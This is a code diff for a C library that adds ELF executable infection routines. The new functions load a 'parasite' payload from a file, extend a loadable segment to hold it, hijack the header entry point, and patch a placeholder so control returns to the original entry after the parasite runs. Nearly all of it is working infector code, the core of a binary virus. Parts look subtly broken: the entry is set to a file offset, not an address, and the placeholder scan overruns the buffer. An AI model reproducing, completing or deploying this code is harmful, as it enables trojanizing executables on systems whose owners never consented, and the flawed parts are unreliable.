@@ -3,6 +3,7 @@
 #include <fcntl.h>
 #include <stdint.h>
 #include <stdio.h>
+#include <stdlib.h>
 #include <string.h>
 #include <sys/mman.h>
 #include <sys/stat.h>
@@ -79,5 +80,68 @@ void xelf_seg_set_flags(Elf64_Phdr *seg, uint32_t flags) {
     seg->p_flags = flags;
 }
 
-void xelf_seg_inject_code(Elf64_Phdr *seg, int8_t *parasite,
-                          size_t parasite_size) {}
+int xelf_inject_load_from_file(struct inject *inject, const char *filepath) {
+  if (!inject || !filepath)
+    return 1;
+  int fd = open(filepath, O_RDONLY);
+  if (fd < 0)
+    return 2;
+  struct stat file_stat;
+  lstat(filepath, &file_stat);
+  inject->size = file_stat.st_size;
+  inject->code = (int8_t *)malloc(inject->size);
+  if (!inject->code) {
+    close(fd);
+    return 3;
+  }
+  if (read(fd, inject->code, inject->size) < 0) {
+    close(fd);
+    return 4;
+  }
+  close(fd);
+  return 0;
+}
+
+int xelf_inject_set_entrypoint(Elf64_Phdr *seg, struct inject *inject) {
+  if (!seg || !inject)
+    return -1;
+  inject->offset = seg->p_offset + seg->p_filesz;
+  inject->addr = seg->p_vaddr + seg->p_filesz;
+  seg->p_filesz += inject->size;
+  seg->p_memsz += inject->size;
+  // TODO check that we dont overwrite the next segment !
+  return 0;
+}
+
+void xelf_inject_patch_header(struct xelf *xelf, struct inject *inject) {
+  if (!xelf || !inject)
+    return;
+  inject->og_entry = xelf->header->e_entry;
+  xelf->header->e_entry = inject->offset;
+  for (unsigned int i = 0; i < xelf->header->e_shnum; i++) {
+    Elf64_Shdr *sec = &xelf->sec_header_tab[i];
+    Elf64_Off sec_end = sec->sh_offset + sec->sh_size;
+    if (inject->offset == sec_end) {
+      sec->sh_size += inject->size;
+      return;
+    }
+  }
+}
+
+void xelf_inject_set_exitpoint(struct inject *inject) {
+  if (!inject)
+    return;
+  long replace = 0xAAAAAAAAAAAAAAAA;
+  uint8_t *ptr = (uint8_t *)inject->code;
+  for (unsigned int i = 0; i < inject->size; i++) {
+    long current_QWORD = *((long *)(ptr + i));
+    if (!(replace ^ current_QWORD)) {
+      *((long *)(ptr + i)) = inject->og_entry;
+      return;
+    }
+  }
+}
+
+void xelf_inject(struct xelf *xelf, struct inject *inject) {
+  memcpy(xelf->elf + inject->offset, inject->code, inject->size);
+}
